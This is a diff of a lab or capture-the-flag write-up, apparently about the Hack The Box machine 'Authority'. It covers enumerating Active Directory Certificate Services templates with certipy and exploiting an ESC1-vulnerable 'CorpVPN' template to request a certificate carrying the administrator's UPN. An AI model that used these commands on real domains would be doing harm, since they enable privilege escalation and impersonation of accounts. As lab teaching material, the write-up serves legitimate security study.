@@ -1,13 +1,11 @@
 # ADCS
 
-AD CS is a Microsoft server role solution for public key infrastructure (PKI) that provides myriad services within an AD environment.
-AD CS can provide certificate-based user authentication – which can be an extremely useful tool for managing an AD environment – but it can also be an extremely useful tool for compromising one. 
+AD CS is a Microsoft server role solution for public key infrastructure (PKI) that provides various services within an AD environment, in the form of certificate-based client authentication.
+Misconfigurations in certificate templates bring about various vulnerabilities, which we will explore in this writeup. 
 
 ### Enumeration
 
-```certipy``` enumerates vulnerabilities in certificate templates
-
-```$ certipy find -u 'username@authority.htb' -p 'password' -dc-ip 10.10.11.222```
+```$ certipy find -u 'username@authority.htb' -p 'password' -dc-ip 10.10.11.222 -enabled```
 
 ```
 {
@@ -58,11 +56,11 @@ AD CS can provide certificate-based user authentication – which can be an extr
   }
 ```
 
-for example, the template 'CorpVPN' is vulnerable ESC1, where an enrolle from the Domain Computers security group can supply a subject for client authentication.
+for example, the template 'CorpVPN' is vulnerable to 'ESC1', where an enrolle from the Domain Computers security group can supply a subject for client authentication, effectively allowing the impersonation of users in the domain.
 
 ### Exploitation
 
-An attacker with a user or machine account with an enrollment right would request a certificate with the UPN of the target account:
+An attacker with a user or machine account with an enrollment right would request a certificate with the UPN of the victim account:
 ```$ certipy req -u 'pc01$' -p 'password' -template CorpVPN -upn 'administrator@authority.htb -target authority.authority.htb -ca AUTHORITY-CA'```
 
 ```
